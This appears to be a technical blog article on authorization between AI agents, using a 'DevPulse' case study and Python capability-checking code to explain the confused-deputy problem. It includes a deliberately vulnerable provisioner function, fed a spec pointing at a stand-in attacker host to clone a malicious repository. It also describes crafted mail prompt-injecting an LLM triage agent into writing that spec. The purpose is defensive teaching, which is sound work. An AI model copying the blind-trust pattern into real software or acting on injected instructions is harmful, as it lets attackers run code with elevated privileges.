# Designing the trust boundary: authorization between agents that isn't an afterthought

*Governance content on multi-agent systems is almost entirely vendor blog posts describing guardrails in the abstract. This article walks through an actual failure mode with actual code, using the same case study this series has run since Article 01, because the point where DevPulse's classifier hands off to its provisioner is exactly where authorization tends to get skipped.*

## The relationship that was never actually secured

Articles 02 and 03 named the classifier-to-provisioner relationship twice already, and never once asked what happens if the file the classifier writes cannot be trusted.

Article 02 called it a supervisor-mediated blackboard: the classifier writes to a shared filesystem, the provisioner reads from it later, no direct message between them. Article 03 called it the one genuinely sequential relationship in the whole system, the fourth link out of DevPulse's ten mathematically possible pairs.

Both were right. Neither asked the question this article exists to ask: when the provisioner reads that file and acts on it, cloning a repository and spinning up containers, whose authority is it actually acting on? Its own, or whatever the classifier happened to write?

## The confused deputy, now in a delegation chain

This is not a new problem invented by multi-agent systems. The term comes from a 1988 paper by Norm Hardy, describing a real incident at a timesharing company called Tymshare: a compiler installed in a privileged system directory had write access to everything in that directory, including the company's billing file. A user could pass the compiler a debug-output filename of their choosing, and the compiler — a "deputy" acting with more privilege than the user who invoked it — wrote to whatever path it was given, including the billing file itself. Nobody attacked the compiler. The compiler simply could not distinguish a legitimate debug-output path from an instruction to overwrite billing data, because it never checked whether the requesting user actually had authority over that specific path. What is new is where this shows up now. A 2026 paper on authorization propagation in multi-agent AI systems identifies this exact failure mode in agent-to-agent delegation specifically, and names the mechanism plainly: even when each individual step in a workflow is independently authorized, the aggregate result can exceed what any single access would have permitted.

Translated into DevPulse: the file classifier has narrow authority. It can read `~/Downloads` and write to one project folder. The workspace provisioner has much broader authority. It can clone repositories and execute containers. If the provisioner treats "a file exists in the expected folder, written by an agent I trust" as sufficient grounds to act, the classifier's narrow authority has effectively been laundered into the provisioner's broad authority. Neither agent did anything individually wrong. The aggregate crossed a line neither one was authorized to cross alone.

<image src="file-upload://3a5c633a-e23a-8159-9355-00b2b882bdfb"></image>

*The same classifier-provisioner relationship from Articles 02-03, now examined for what actually crosses the boundary.*

## Scope drift is the same failure, described from the other direction

A related pattern shows up constantly in production reporting on this: an agent authorized for one narrow task delegates part of the work downstream, and the delegated scope quietly widens rather than narrows. An agent cleared to read a specific quarter's revenue figures hands off to a charting agent, which calls an external rendering service — and the figures have now left the boundary the original authorization was scoped to, three hops deep, with each individual hop looking locally reasonable.

DevPulse's version is smaller in stakes but structurally identical. The classifier is scoped to sort files into project folders. If the provisioner inherits whatever the classifier's output implies, rather than verifying its own independently-granted scope, the system has the same shape as the revenue-figures example — just with fewer zeros attached.

## What actually stops this: capabilities that cannot be inherited upward

The fix is not "trust the classifier more carefully." The fix is that the provisioner should never be inheriting authority from the classifier in the first place. Each agent gets its own capability, issued independently by a root authority, narrow enough to cover exactly what that agent needs and nothing else.

`scoped_capability_checker.py`, in this folder's `src/`, implements this directly:

```python
classifier_cap = Capability(
    granted_to="file-classifier",
    actions=frozenset({"read:downloads", "write:project:PAY-402:spec"}),
    issued_by="root",
)
provisioner_cap = Capability(
    granted_to="workspace-provisioner",
    actions=frozenset({"read:project:PAY-402:spec", "exec:docker", "exec:git-clone"}),
    issued_by="root",
)
```

Neither capability is derived from the other. That is the actual fix, not a detail. The provisioner's authority to run Docker and clone repositories comes from its own grant, checked before every action — never from trusting a file the classifier happened to write.

Try to force the confused-deputy pattern anyway, and the delegation check catches it directly:

```python
delegate(classifier_cap, to_agent="workspace-provisioner", requested_actions=frozenset({"exec:docker"}))
# -> ScopeExceededError: file-classifier cannot delegate {'exec:docker'} to
#    workspace-provisioner - exceeds file-classifier's own granted scope
```

The classifier cannot hand over what it never held. Not because the code trusts the classifier less, but because the delegation check enforces a rule independent of trust entirely: you cannot grant what you do not have.

## The vulnerable version, made concrete rather than described

It is easy to describe a vulnerability in the abstract and easy to nod along without feeling why it matters. Here is the actual vulnerable function, in the same file, for direct contrast:

```python
def vulnerable_blind_trust(spec_file_path: str, spec_contents: dict) -> str:
    repo_url = spec_contents.get("repo_url")
    return f"cloning and provisioning from {repo_url} - no authorization check performed"
```

Run it against an attacker-controlled spec and it does exactly what it looks like it does:

```python
attacker_spec = {"repo_url": "https://attacker.example/malicious-payload.git"}
vulnerable_blind_trust("PAY-402/spec.json", attacker_spec)
# -> "cloning and provisioning from https://attacker.example/malicious-payload.git -
#     no authorization check performed"
```

This is where the confused-deputy problem stops being an academic formulation and becomes an actual attack surface. If the inbox-triage agent is LLM-driven and processes untrusted incoming mail, a sufficiently crafted message is a real path toward getting a malicious spec written into that project folder — not because the classifier was compromised in the sense of being hacked, but because it was given a plausible-looking instruction it had no way to distinguish from a legitimate one. The vulnerable provisioner has no defense against this, because it never asked the one question that would have stopped it: does this specific action fall within what I was actually granted, independent of who or what is asking.

## This is not a novel mechanism, and citing it as one would be dishonest

Capability-based security predates multi-agent LLM systems by decades. What is genuinely new is the specific shape of the problem in this setting, and 2026 research is actively formalizing it: invocation-bound capability tokens that fuse identity, attenuated authorization, and provenance into a single append-only chain have been proposed with reference implementations showing sub-millisecond verification latency and complete rejection across hundreds of adversarial delegation attempts in testing. The mechanism in this article's code — narrow, independently-issued, non-inheritable capabilities — is the same underlying idea in a form simple enough to actually read and verify in one sitting.

Production implementations of this pattern commonly layer on OAuth-based per-agent credentials and policy engines like Cedar for expressing the actual rules, with audit logging that can reconstruct a full delegation chain from a single task ID. None of that changes the core requirement this article is built around: authority has to be independently granted and independently checked at every boundary, not inherited by proximity or by whichever agent happened to act first.

Worth being specific about what that audit trail actually needs to contain, since "audit logging" is often stated as a checkbox rather than a real requirement. For DevPulse's classifier-provisioner boundary, a reconstructable record needs at minimum: which capability the provisioner checked against, the specific action requested, the outcome of that check, and a reference back to the task ID that originated the whole chain. Four fields, not a vague "we log things." If a compliance question ever comes in — why did the provisioner clone that particular repository — the honest answer should be reconstructable from those four fields alone, not from reading application logs and guessing at intent after the fact.

This is also where this article's approach diverges most from what is actually available on this topic today. Search for multi-agent authorization content and the overwhelming majority is a vendor's product page, describing the value of "guardrails" or "governance" in the abstract, with a demo request button at the bottom. None of it shows the actual check failing on an actual malicious input, the way `vulnerable_blind_trust` does two sections above. The gap in existing content is not a lack of awareness that authorization matters — it is a lack of anything a reader could run themselves and watch fail.

## Deciding whether a relationship actually needs this

Not every agent-to-agent relationship in a system needs the full weight of independently-issued capabilities and audit trails. The inbox-triage and calendar agents in DevPulse never cross a privilege boundary with each other — neither can act on the other's behalf, so there is nothing for a confused deputy to exploit between them. The question worth asking about any specific relationship is narrower than "does this system need authorization infrastructure": does one agent's output ever become the direct basis for another agent's higher-privilege action? If yes, that specific relationship needs an independently-checked boundary. If the two agents' privilege levels are comparable and neither can meaningfully escalate through the other, a shared, simpler credential model is a reasonable and honest choice, not a shortcut.

A quick way to find every relationship in an existing system that needs this check: list every pair of agents that actually exchange something (a file, a message, a task), and for each pair ask which one holds more privilege. Any pair where the answer is not "roughly equal" is a candidate. In DevPulse, that is exactly one relationship out of the five real coordination links Article 01 identified — which is itself a useful data point. Most of a system's coordination links do not need this machinery. The one that does needs it precisely, not the whole system needing it vaguely.

One relationship worth checking against this same framework, honestly, rather than assuming it is exempt: the supervisor's own authority over all four agents. The supervisor dispatches work to every agent in the system, which means it necessarily holds broad authority. Does that make the supervisor itself a confused-deputy risk? Only if the supervisor blindly forwards a request it received from outside the system — a user's instruction, say — without checking whether that instruction actually falls within what the requesting party was authorized to ask for. The supervisor's own privilege is not the problem; a supervisor that never validates the authority behind the requests it dispatches is the same pattern this whole article has been describing, one level up.

## What this looks like Monday morning

Before wiring two agents together with a handoff, ask the question this article opened with, specifically: when the second agent acts, whose authority is it acting on? If the honest answer is "whatever the first agent's output implies," that is the confused-deputy pattern waiting to happen, whether or not anything has gone wrong yet.

Give every agent its own independently-issued, narrowly-scoped capability, and verify it before every action — not once at startup, not inherited from whoever handed off the task. The delegation chain in your own system is only as trustworthy as the weakest hop that was never actually checked.

Go find the one relationship in your own system where a lower-privilege agent's output becomes the input to a higher-privilege agent's action. That is your confused-deputy candidate. Ask whether the downstream agent actually checks its own scope before acting, or whether it just trusts the file, the message, or the task because it came from somewhere familiar.

The next article in this series picks up from here: once authorization is designed rather than assumed, the next question is what happens when an agent still gets it wrong — preventing the MAST failure modes by design, not by autopsy.

---

*This article was researched and drafted with AI assistance, then reviewed and edited by Praveen Kumar.*

## Series: Design Multi-Agent Systems

1. Multi-agent or overkill? A decision framework before you add a second agent — not yet published
2. The coordination primitives: control, state, and communication — a vendor-neutral model — not yet published
3. The four canonical orchestration patterns, and how to actually choose one — not yet published
4. **Designing the trust boundary: authorization between agents that isn't an afterthought** *(this article)*
5. Preventing the MAST failure modes by design, not by autopsy — not yet published
6. Observability and evaluation for multi-agent systems: what to actually measure — not yet published
7. Shared-resource contention: when your agents fight over the same database row — not yet published
8. Putting it together: designing a production multi-agent system end to end — not yet published

## References

1. Hardy, N. The Confused Deputy (or why capabilities might have been invented), ACM SIGOPS Operating Systems Review, Vol 22, No 4, 1988
2. Authorization Propagation in Multi-Agent AI Systems: Identity Governance as Infrastructure (2026)
   https://arxiv.org/abs/2605.05440
3. Who Authorized That? The Delegation Problem in Multi-Agent AI, O'Reilly Radar
   https://www.oreilly.com/radar/who-authorized-that-the-delegation-problem-in-multi-agent-ai/
4. How to secure AI agent delegation and multi-agent communication, WorkOS
   https://workos.com/blog/ai-agent-delegation-multi-agent-security
